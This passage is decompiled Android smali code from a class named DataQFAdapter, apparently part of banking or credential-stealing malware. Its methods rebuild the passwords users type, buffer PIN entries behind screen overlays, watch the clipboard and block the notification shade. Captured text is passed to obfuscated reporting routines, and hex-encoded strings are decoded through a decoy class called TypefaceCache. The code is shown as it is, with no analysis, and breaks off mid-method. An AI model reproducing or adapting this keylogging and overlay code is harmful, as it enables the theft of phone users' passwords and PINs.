    invoke-static {v5}, Lv/s/gA5gCwTK0qjTIn;->dTS0S7eC32ubQH54j36([Ljava/lang/Object;)Ljava/util/Set;

    .line 57
    .line 58
    .line 59
    move-result-object v5

    .line 60
    const/16 v6, 0x0

    .line 61
    move/from16 v7, v6

    .line 62
    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 63
    .line 64
    .line 65
    move-result v8

    .line 66
    const/4 v9, 0x1

    nop

    .line 67
    if-ge v7, v8, :cond_3

    .line 68
    .line 69
    invoke-virtual {v1, v7}, Ljava/lang/String;->charAt(I)C

    .line 70
    .line 71
    .line 72
    move-result v8

    .line 73
    invoke-static {v8}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 74
    .line 75
    .line 76
    move-result-object v8

    .line 77
    invoke-interface {v5, v8}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 78
    .line 79
    .line 80
    move-result v8

    .line 81
    if-eqz v8, :cond_2

    .line 82
    .line 83
    move v7, v9

    .line 84
    goto :goto_1

    .line 85
    :cond_2
    add-int/lit8 v7, v7, 0x1

    .line 86
    .line 87
    goto :goto_0

    .line 88
    :cond_3
    move/from16 v7, v6

    .line 89
    :goto_1
    iget-object v8, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordBuffers:Ljava/util/HashMap;

    .line 90
    .line 91
    invoke-interface {v8, v2}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 92
    .line 93
    .line 94
    move-result-object v10

    .line 95
    if-nez v10, :cond_4

    .line 96
    .line 97
    new-instance v10, Ljava/lang/StringBuilder;

    .line 98
    .line 99
    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    .line 100
    .line 101
    .line 102
    invoke-interface {v8, v2, v10}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 103
    .line 104
    .line 105
    :cond_4
    check-cast v10, Ljava/lang/StringBuilder;

    .line 106
    .line 107
    if-eqz v7, :cond_d

    .line 108
    .line 109
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    .line 110
    .line 111
    .line 112
    move-result v3

    .line 113
    :goto_2
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 114
    .line 115
    .line 116
    move-result-wide v7

    .line 117
    const-wide/high16 v11, -0x8000000000000000L

    .line 118
    .line 119
    cmp-long v7, v7, v11

    .line 120
    .line 121
    if-nez v7, :cond_5

    .line 122
    .line 123
    invoke-static {}, Ljava/lang/System;->nanoTime()J

    .line 124
    .line 125
    .line 126
    move-result-wide v7

    .line 127
    invoke-static {v7, v8}, Ljava/lang/Long;->hashCode(J)I

    .line 128
    .line 129
    .line 130
    goto :goto_2

    nop

    .line 131
    :cond_5
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 132
    .line 133
    .line 134
    move-result v7

    .line 135
    const/16 v8, 0x0

    nop

    .line 136
    if-nez v7, :cond_6

    nop

    nop

    .line 137
    .line 138
    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 139
    .line 140
    .line 141
    goto/16 :goto_7

    .line 142
    :cond_6
    if-ge v7, v3, :cond_8

    .line 143
    .line 144
    sub-int/2addr v3, v7

    .line 145
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 146
    .line 147
    .line 148
    move-result v6

    .line 149
    if-le v3, v6, :cond_7

    .line 150
    .line 151
    move v3, v6

    .line 152
    :cond_7
    if-lez v3, :cond_b

    .line 153
    .line 154
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 155
    .line 156
    .line 157
    move-result v6

    .line 158
    if-lez v6, :cond_b

    .line 159
    .line 160
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 161
    .line 162
    .line 163
    move-result v6

    .line 164
    sub-int/2addr v6, v3

    .line 165
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 166
    .line 167
    .line 168
    move-result v3

    .line 169
    invoke-virtual {v10, v6, v3}, Ljava/lang/StringBuilder;->delete(II)Ljava/lang/StringBuilder;

    .line 170
    .line 171
    .line 172
    goto/16 :goto_7

    .line 173
    :cond_8
    if-le v7, v3, :cond_b

    .line 174
    .line 175
    :goto_3
    if-ge v3, v7, :cond_b

    .line 176
    .line 177
    if-ltz v3, :cond_9

    .line 178
    .line 179
    invoke-static {v1}, Lv/s/KgSM0TsKUpCiuePB;->dQC4QhgRN3MSEAP3HW0(Ljava/lang/CharSequence;)I

    .line 180
    .line 181
    .line 182
    move-result v6

    .line 183
    if-gt v3, v6, :cond_9

    .line 184
    .line 185
    invoke-virtual {v1, v3}, Ljava/lang/String;->charAt(I)C

    .line 186
    .line 187
    .line 188
    move-result v6

    .line 189
    invoke-static {v6}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 190
    .line 191
    .line 192
    move-result-object v6

    .line 193
    goto :goto_4

    .line 194
    :cond_9
    move-object v6, v8

    nop

    .line 195
    :goto_4
    if-eqz v6, :cond_a

    .line 196
    .line 197
    invoke-interface {v5, v6}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 198
    .line 199
    .line 200
    move-result v11

    .line 201
    if-nez v11, :cond_a

    nop

    nop

    .line 202
    .line 203
    invoke-virtual {v6}, Ljava/lang/Character;->charValue()C

    .line 204
    .line 205
    .line 206
    move-result v6

    .line 207
    :goto_5
    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 208
    .line 209
    .line 210
    goto :goto_6

    nop

    .line 211
    :cond_a
    const/16 v6, 0x3f

    .line 212
    .line 213
    goto :goto_5

    .line 214
    :goto_6
    add-int/lit8 v3, v3, 0x1

    .line 215
    .line 216
    goto :goto_3

    .line 217
    :cond_b
    :goto_7
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 218
    .line 219
    .line 220
    move-result v3

    .line 221
    if-nez v3, :cond_c

    .line 222
    .line 223
    goto :goto_8

    .line 224
    :cond_c
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 225
    .line 226
    .line 227
    move-result v3

    .line 228
    sub-int/2addr v3, v9

    .line 229
    invoke-virtual {v1, v3}, Ljava/lang/String;->charAt(I)C

    .line 230
    .line 231
    .line 232
    move-result v3

    .line 233
    invoke-static {v3}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 234
    .line 235
    .line 236
    move-result-object v8

    .line 237
    :goto_8
    if-eqz v8, :cond_e

    .line 238
    .line 239
    invoke-interface {v5, v8}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 240
    .line 241
    .line 242
    move-result v3

    .line 243
    if-nez v3, :cond_e

    .line 244
    .line 245
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 246
    .line 247
    .line 248
    move-result v3

    nop

    nop

    .line 249
    if-lez v3, :cond_e

    .line 250
    .line 251
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 252
    .line 253
    .line 254
    move-result v3

    .line 255
    sub-int/2addr v3, v9

    .line 256
    invoke-virtual {v8}, Ljava/lang/Character;->charValue()C

    .line 257
    .line 258
    .line 259
    move-result v5

    .line 260
    invoke-virtual {v10, v3, v5}, Ljava/lang/StringBuilder;->setCharAt(IC)V

    .line 261
    .line 262
    .line 263
    goto :goto_9

    .line 264
    :cond_d
    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 265
    .line 266
    .line 267
    invoke-virtual {v10, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 268
    .line 269
    .line 270
    :cond_e
    :goto_9
    iget-object v3, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordRawCache:Ljava/util/HashMap;

    .line 271
    .line 272
    invoke-interface {v3, v2, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 273
    .line 274
    .line 275
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 276
    .line 277
    .line 278
    move-result-object v1

    .line 279
    iget-object v3, v0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    .line 280
    .line 281
    invoke-virtual {v3, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 282
    .line 283
    .line 284
    move-result-object v3

    .line 285
    check-cast v3, Ljava/lang/String;

    .line 286
    .line 287
    if-nez v3, :cond_f

    .line 288
    .line 289
    goto/16 :goto_a

    .line 290
    :cond_f
    move-object/from16 v4, v3

    .line 291
    :goto_a
    invoke-virtual {v1, v4}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 292
    .line 293
    .line 294
    move-result v3

    .line 295
    if-eqz v3, :cond_10

    .line 296
    .line 297
    :goto_b
    return-void

    .line 298
    :cond_10
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 299
    .line 300
    .line 301
    move-result-wide v15

    .line 302
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 303
    .line 304
    .line 305
    move-result v3

    .line 306
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 307
    .line 308
    .line 309
    move-result v4

    .line 310
    if-le v3, v4, :cond_12

    .line 311
    .line 312
    invoke-static {v1}, Lv/s/KgSM0TsKUpCiuePB;->t9CXKrwDxrnFA6g23hZU(Ljava/lang/CharSequence;)C

    .line 313
    .line 314
    .line 315
    move-result v3

    .line 316
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 317
    .line 318
    .line 319
    move-result v4

    .line 320
    sub-int/2addr v4, v9

    .line 321
    const-string v5, "\u2022"

    .line 322
    .line 323
    invoke-static {v5, v4}, Lv/s/BS2kx9eAoOyDiNGAFlFk;->qfTrc75xwRVMl85vh(Ljava/lang/String;I)Ljava/lang/String;

    .line 324
    .line 325
    .line 326
    move-result-object v4

    nop

    nop

    .line 327
    new-instance v5, Ljava/lang/StringBuilder;

    .line 328
    .line 329
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 330
    .line 331
    .line 332
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 333
    .line 334
    .line 335
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 336
    .line 337
    .line 338
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 339
    .line 340
    .line 341
    move-result-object v12

    .line 342
    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 343
    .line 344
    const-string v4, "002800730042008B00FF00B8"

    .line 345
    .line 346
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 347
    .line 348
    .line 349
    move-result-object v11

    .line 350
    iget-object v4, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppName:Ljava/lang/String;

    .line 351
    .line 352
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    .line 353
    .line 354
    .line 355
    move-result v5

    .line 356
    if-nez v5, :cond_11

    .line 357
    .line 358
    iget-object v4, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    .line 359
    .line 360
    :cond_11
    move-object/from16 v13, v4

    .line 361
    iget-object v14, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    .line 362
    .line 363
    iget-object v4, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldType:Ljava/lang/String;

    nop

    .line 364
    .line 365
    iget-object v5, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHint:Ljava/lang/String;

    .line 366
    .line 367
    iget-object v6, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollViewId:Ljava/lang/String;

    .line 368
    .line 369
    new-instance v10, Lv/s/NxAMaDFbSCxW6M03f;

    .line 370
    .line 371
    const/16 v20, 0x1

    .line 372
    .line 373
    move-object/from16 v17, v4

    .line 374
    .line 375
    move-object/from16 v18, v5

    .line 376
    .line 377
    move-object/from16 v19, v6

    .line 378
    .line 379
    invoke-direct/range {v10 .. v20}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 380
    .line 381
    .line 382
    invoke-virtual {v3, v10}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 383
    .line 384
    .line 385
    :cond_12
    iget-object v3, v0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTextCache:Ljava/util/HashMap;

    nop

    .line 386
    .line 387
    invoke-interface {v3, v2, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 388
    .line 389
    .line 390
    invoke-static/range {v15 .. v16}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    .line 391
    .line 392
    .line 393
    move-result-object v3

    .line 394
    iget-object v4, v0, Lapp/mobilex/plus/services/DataQFAdapter;->fieldTimeCache:Ljava/util/HashMap;

    .line 395
    .line 396
    invoke-interface {v4, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 397
    .line 398
    .line 399
    iget-object v3, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordGrabberRunnables:Ljava/util/HashMap;

    .line 400
    .line 401
    invoke-virtual {v3, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 402
    .line 403
    .line 404
    move-result-object v3

    .line 405
    check-cast v3, Ljava/lang/Runnable;

    nop

    .line 406
    .line 407
    if-eqz v3, :cond_13

    .line 408
    .line 409
    iget-object v4, v0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 410
    .line 411
    invoke-virtual {v4, v3}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 412
    .line 413
    .line 414
    :cond_13
    new-instance v3, Lv/s/BTOcbbE0oRvXzVh9;

    .line 415
    .line 416
    const/4 v4, 0x0

    .line 417
    invoke-direct {v3, v0, v2, v1, v4}, Lv/s/BTOcbbE0oRvXzVh9;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    .line 418
    .line 419
    .line 420
    iget-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordGrabberRunnables:Ljava/util/HashMap;

    .line 421
    .line 422
    invoke-interface {v1, v2, v3}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 423
    .line 424
    .line 425
    iget-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->keylogDebounceHandler:Landroid/os/Handler;

    .line 426
    .line 427
    iget-wide v4, v0, Lapp/mobilex/plus/services/DataQFAdapter;->PASSWORD_GRABBER_DELAY_MS:J

    .line 428
    .line 429
    invoke-virtual {v1, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 430
    .line 431
    .line 432
    return-void
.end method

.method private static final processPwdPollText$lambda$8(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;Ljava/lang/String;)V
    .locals 12

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordBuffers:Ljava/util/HashMap;

    .line 2
    .line 3
    invoke-virtual {v0, p1}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Ljava/lang/StringBuilder;

    .line 8
    .line 9
    if-eqz v0, :cond_1

    .line 10
    .line 11
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object v0

    nop

    nop

    .line 15
    if-nez v0, :cond_0

    .line 16
    .line 17
    goto/16 :goto_0

    .line 18
    :cond_0
    move-object/from16 v3, v0

    .line 19
    goto :goto_1

    .line 20
    :cond_1
    :goto_0
    move-object v3, p2

    .line 21
    :goto_1
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    .line 22
    .line 23
    .line 24
    move-result p2

    .line 25
    const/4 v0, 0x2

    nop

    nop

    .line 26
    if-lt p2, v0, :cond_3

    .line 27
    .line 28
    sget-object p2, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 29
    .line 30
    const-string v0, "002800730042008B00FF00B8"

    .line 31
    .line 32
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 33
    .line 34
    .line 35
    move-result-object v2

    .line 36
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppName:Ljava/lang/String;

    .line 37
    .line 38
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 39
    .line 40
    .line 41
    move-result v1

    .line 42
    if-nez v1, :cond_2

    .line 43
    .line 44
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    nop

    .line 45
    .line 46
    :cond_2
    move-object v4, v0

    .line 47
    iget-object v5, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    .line 48
    .line 49
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 50
    .line 51
    .line 52
    move-result-wide v6

    .line 53
    iget-object v8, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldType:Ljava/lang/String;

    .line 54
    .line 55
    iget-object v9, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHint:Ljava/lang/String;

    .line 56
    .line 57
    iget-object v10, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollViewId:Ljava/lang/String;

    .line 58
    .line 59
    new-instance v1, Lv/s/NxAMaDFbSCxW6M03f;

    .line 60
    .line 61
    const/4 v11, 0x1

    .line 62
    invoke-direct/range {v1 .. v11}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 63
    .line 64
    .line 65
    invoke-virtual {p2, v1}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 66
    .line 67
    .line 68
    iget-object p2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    .line 69
    .line 70
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldType:Ljava/lang/String;

    .line 71
    .line 72
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHint:Ljava/lang/String;

    .line 73
    .line 74
    invoke-static {p2, v3, v0, v1}, Lv/s/GARjgaGEpTotOxcl8vfe;->hV4VTKNUdeHN(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 75
    .line 76
    .line 77
    iget-object p2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollAppPkg:Ljava/lang/String;

    .line 78
    .line 79
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldType:Ljava/lang/String;

    .line 80
    .line 81
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollHint:Ljava/lang/String;

    .line 82
    .line 83
    const/4 v2, 0x1

    .line 84
    invoke-static {p2, v3, v0, v1, v2}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 85
    .line 86
    .line 87
    :cond_3
    iget-object p0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordGrabberRunnables:Ljava/util/HashMap;

    .line 88
    .line 89
    invoke-virtual {p0, p1}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    .line 90
    .line 91
    .line 92
    return-void
.end method

.method public static synthetic pyu8ovAipBTLYAiKab(Ljava/lang/Runnable;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed$lambda$1(Ljava/lang/Runnable;)V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method public static final refreshUiBlockFlags(Lorg/json/JSONObject;)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lv/s/GARjgaGEpTotOxcl8vfe;->tne6mXOUFKdd(Lorg/json/JSONObject;)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method private final removeClipboardListener()V
    .locals 2

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->clipboardListener:Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->clipboardManager:Landroid/content/ClipboardManager;

    .line 6
    .line 7
    if-eqz v1, :cond_0

    .line 8
    .line 9
    invoke-virtual {v1, v0}, Landroid/content/ClipboardManager;->removePrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 10
    .line 11
    .line 12
    :cond_0
    const/4 v0, 0x0

    .line 13
    iput-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->clipboardListener:Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;

    .line 14
    .line 15
    return-void

    nop

    nop
.end method

.method private final removePinOverlay()V
    .locals 3

    .line 1
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 2
    .line 3
    if-nez v0, :cond_0

    .line 4
    .line 5
    goto/16 :goto_0

    .line 6
    :cond_0
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 7
    .line 8
    :try_start_0
    sget-object v1, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    .line 9
    .line 10
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayView:Landroid/view/View;

    .line 11
    .line 12
    if-eqz v1, :cond_1

    .line 13
    .line 14
    if-eqz v2, :cond_1

    nop

    .line 15
    .line 16
    invoke-interface {v1, v2}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 17
    .line 18
    .line 19
    :catchall_0
    :cond_1
    const/16 v1, 0x0

    .line 20
    iput-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayView:Landroid/view/View;

    .line 21
    .line 22
    const/16 v1, 0x0

    .line 23
    iput-boolean v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 24
    .line 25
    iput-boolean v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayTouchable:Z

    .line 26
    .line 27
    const-string v1, ""

    .line 28
    .line 29
    iput-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 30
    .line 31
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    .line 32
    .line 33
    .line 34
    move-result v1

    .line 35
    if-lez v1, :cond_2

    .line 36
    .line 37
    invoke-direct {p0, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->flushPinBufferNow(Ljava/lang/String;)V

    .line 38
    .line 39
    .line 40
    :cond_2
    :goto_0
    return-void
.end method

.method private final removeShadeBarrier()V
    .locals 5

    .line 1
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierActive:Z

    .line 2
    .line 3
    if-nez v0, :cond_0

    .line 4
    .line 5
    return-void

    .line 6
    :cond_0
    const/4 v0, 0x0

    .line 7
    const/16 v1, 0x0

    .line 8
    :try_start_0
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->statusBarOverlay:Lv/s/s50M5De8F5UWQVP09E;

    .line 9
    .line 10
    if-eqz v2, :cond_3

    .line 11
    .line 12
    iget-boolean v3, v2, Lv/s/s50M5De8F5UWQVP09E;->JXn4Qf7zpnLjP5:Z

    .line 13
    .line 14
    if-nez v3, :cond_1

    .line 15
    .line 16
    goto :goto_0

    .line 17
    :cond_1
    iget-object v3, v2, Lv/s/s50M5De8F5UWQVP09E;->w9sT1Swbhx3hs:Landroid/os/Handler;

    .line 18
    .line 19
    iget-object v4, v2, Lv/s/s50M5De8F5UWQVP09E;->xDyLpEZyrcKVe0:Lv/s/YqOiSVb2wSv9Lq63qb;

    .line 20
    .line 21
    invoke-virtual {v3, v4}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 22
    .line 23
    .line 24
    sget-object v3, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    nop

    .line 25
    .line 26
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 27
    .line 28
    .line 29
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getAccessWindowManager$cp()Landroid/view/WindowManager;

    .line 30
    .line 31
    .line 32
    move-result-object v3

    .line 33
    iget-object v4, v2, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF:Landroid/widget/ImageView;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 34
    .line 35
    if-eqz v3, :cond_2

    nop

    .line 36
    .line 37
    if-eqz v4, :cond_2

    .line 38
    .line 39
    :try_start_1
    invoke-interface {v3, v4}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 40
    .line 41
    .line 42
    :catch_0
    :cond_2
    :try_start_2
    iput-object v1, v2, Lv/s/s50M5De8F5UWQVP09E;->vekpFI4d1Nc4fakF:Landroid/widget/ImageView;

    .line 43
    .line 44
    iput-boolean v0, v2, Lv/s/s50M5De8F5UWQVP09E;->JXn4Qf7zpnLjP5:Z

    .line 45
    .line 46
    const-string v2, "00100062005A009300E500AC009200A500220064001B008800E600BA00C000AB0022006F001B008F00F900BB00D600A2002D"

    .line 47
    .line 48
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 49
    .line 50
    .line 51
    :catch_1
    :cond_3
    :goto_0
    :try_start_3
    sget-object v2, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    .line 52
    .line 53
    iget-object v3, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierView:Landroid/view/View;

    .line 54
    .line 55
    if-eqz v2, :cond_4

    .line 56
    .line 57
    if-eqz v3, :cond_4

    .line 58
    .line 59
    invoke-interface {v2, v3}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 60
    .line 61
    .line 62
    :catch_2
    :cond_4
    iput-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierView:Landroid/view/View;

    .line 63
    .line 64
    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->shadeBarrierActive:Z

    .line 65
    .line 66
    const-string v0, "00180045007300A600D4009A00EF00E7000100770049009500F900BA00C000E7002C0060005E009500FC00BE00CB00E7003100730056008800E600BA00D6"

    .line 67
    .line 68
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 69
    .line 70
    .line 71
    return-void
.end method

.method private final resolveAppName(Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    .line 1
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    .line 2
    .line 3
    .line 4
    move-result v0

    .line 5
    if-nez v0, :cond_0

    .line 6
    .line 7
    const-string p1, ""

    .line 8
    .line 9
    return-object p1

    .line 10
    :cond_0
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->appNameCache:Ljava/util/concurrent/ConcurrentHashMap;

    .line 11
    .line 12
    invoke-virtual {v0, p1}, Ljava/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 13
    .line 14
    .line 15
    move-result-object v1

    .line 16
    check-cast v1, Ljava/lang/String;

    .line 17
    .line 18
    if-eqz v1, :cond_1

    .line 19
    .line 20
    return-object v1

    .line 21
    :cond_1
    invoke-virtual {v0}, Ljava/util/concurrent/ConcurrentHashMap;->size()I

    .line 22
    .line 23
    .line 24
    move-result v1

    .line 25
    const/16 v2, 0x21d

